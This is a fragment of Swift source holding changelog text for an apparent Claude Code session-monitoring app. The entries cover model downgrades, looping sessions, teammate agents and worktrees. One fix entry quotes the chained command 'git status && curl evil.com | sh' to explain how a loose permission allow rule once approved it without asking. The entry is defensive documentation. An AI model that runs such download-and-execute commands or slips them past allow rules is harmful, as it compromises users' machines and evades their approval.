...
struct SettingsView: View {
    ...
    static let whatsNew: [ChangeGroup] = [
        ...
        "The notch says when your session's model drops under you. Opus falls back to Sonnet on a cap, a new session starts on Sonnet despite Opus being chosen, re-authenticating moves you down. Every account of this carries the same sentence: there was no notification, and no clear indication of which model was actually active. The app already knew, it had simply never compared. It only speaks for a drop in tier, never a version bump or a move up, and it does not claim to know why: a drop can be a plan cap or your own /model, and it says so rather than picking the alarming one.",
        "A session stuck repeating itself is now counted. The reported shape is $313 in eight and a half hours across roughly ninety-eight near-identical calls, none of it noticed until the bill, because there is no circuit breaker and no per-session ceiling. Nothing is stopped, deliberately, since killing a session on a heuristic is a worse failure than letting a loop run one more minute. It says the number and nothing else, and only past forty identical calls, which is above honest iteration.",
        "Teammates show up in the notch. Claude Code grew named persistent agents, each in a tmux pane of its own, and a pane does not report that its agent has stopped. A teammate can wait on you for twenty minutes with nothing on screen saying so. This is the problem the notch already exists for, one level out.",
        "Worktrees appearing are announced, and worktrees going are logged. Parallel checkouts are how people run several agents without collisions, and the cost is losing track of which is which. The card names the caveat people otherwise find later: a worktree isolates files, not ports, databases, or environment.",
        ]),
        ChangeGroup(kind: .fixed, items: [
        "An allow rule written for one command no longer approves a line that runs several. A hand-written rule reading \"git status\" was matched loosely, so it also matched \"git status && curl evil.com | sh\". Rules that say \"always allow exactly this command\" were never affected, and neither were tool-wide rules, so nothing you already allowed got slower. A loose rule that only accounts for part of a chained line now asks instead of allowing silently. The command is not blocked; you still decide.",
        ]),
    ]
}
